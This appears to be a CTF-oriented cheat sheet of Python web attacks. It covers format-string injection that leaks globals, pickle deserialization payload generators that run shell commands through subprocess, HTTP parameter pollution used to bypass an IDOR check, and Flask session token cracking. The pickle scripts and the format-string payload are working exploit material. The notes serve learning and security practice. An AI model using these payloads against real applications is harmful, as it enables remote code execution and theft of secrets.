# Python

Always look out for `str.replace()` because yes...

## Format string injection

Format string injection usually occurs when using `.format()`.

Example:
```py
a = input()
vuln = f'{{{a}}}'.format(random_string='asdf')
```

> `f'{{{a}}}'` resolves to `'{asdf}'`, input being `'asdf'`, which is passed to `'{asdf}'.format()`

> Instead of a single key, a dictionary can also be passed into `.format(**dict)`

The exploit is similar to SSTI RCE, but in this case, we don't have RCE as we cannot execute anything. Rather, we only can leak sensitive secrets (like flags)

1. Get access to a `__globals__` through the dict passed in 
	* `<key>.__init__.__globals__`
2. Access any global variable through `__globals__[name]`

> Note: if the application passes in additional attributes (like `f'{{{a}.code}}.format(**dict)`) that does not exist 
> in a string, you can escape {} and access another "proper" item that has the desired attribute

Payload:

`{item.__init__.__globals__[flag]} {item`

## Pickle unserialize

The pickle module is vulnerable to unsafe deserialization of Python objects.

Exploit:

```py
import base64, os, pickle, subprocess

class RCE:
    def __reduce__(self):
        cmd = 'cat flag.txt'
        a = subprocess.check_output, (cmd,)
        return a

pickled = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(pickled))
```

Note that the exploit below may not work on all systems/challenges.

```py
DEFAULT_COMMAND = ['env']

import pickle
import base64
import requests

#COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    ''' __reduce__ can return either a string or a tuple. If it returns a string, then it should be the name of a global variable. If it returns a tuple, it should be in the following syntax: callable, (args), *object's state (will be passed to __setstate__(), *iterator of items (for list subclasses), *iterator of key-value pairs (for dict subclasses or if the class implements __setitem__()), *(obj, state) to set state of class (overriding __setstate__() if implemented)

    The one we are interested in for RCE is callable, (args)

    This has been implemented below.
    '''

    def __reduce__(self):
        import subprocess
        #import os
        return subprocess.check_output, (DEFAULT_COMMAND,)

def gen_payload():
    payload = bytes.decode(base64.b64encode(pickle.dumps(PickleRce())), 'utf-8')
    return payload

print(gen_payload())
```

Instead of `subprocess.check_output`, we can also use `os.popen().read()`, but note that on Windows, there is an issue serializing the os module which becomes "nt" module for some reason.

## HTTP Parameter Pollution with IDOR Vulnerability

> Example: A flask app which makes an internal API call to a FastAPI app.

```python
uid = request.args.get("uid")  
if(uid == str(current_user.user["id"])):   # MOST IMPORTANT CHECK! 
   # pass the url behind to fastapi
   fullurl = request.url 
   path = fullurl.replace(request.url_root, "").replace("fastapi", "")
   forwardurl = "http://localhost:8000" + path
   app.logger.debug("Forwarded URL to Fastapi: %s", forwardurl)
   r = requests.get(forwardurl)
   if(r.ok):
       try:
           j = r.json()
           msg = j['message']
           return Response(msg, status=200)
```

```python
@app.get("/retrievekey")
async def hpp(uid: str):
    r = db.getkey(uid)
    if(r and r['key']):
        location = "/securenote/" + r['key']
        result = 'You will redirect to your secure URL <a href="' + location + '">here</a>'
        # redirects
    return {"message": html}
```

You may think that Insecure Direct Object Reference (IDOR) is not possible, but it is!

Flask kind of "prefers" the first param while FastAPI "prefers" the last one (if you supply two `?uid=` params).

Hence by doing `retrievekey?uid=[i am authorised] &uid=[admin]`, we can access things which we aren't meant to access.

Resource: https://0xgaurang.medium.com/case-study-bypassing-idor-via-parameter-pollution-78f7b3f9f59d

## Flask Session Token

https://github.com/Paradoxis/Flask-Unsign  

Flask session tokens can be cracked, then resigned, something like JWT.  
> flask session tokens will always seem like the header is the body and the rest junk in jwt.io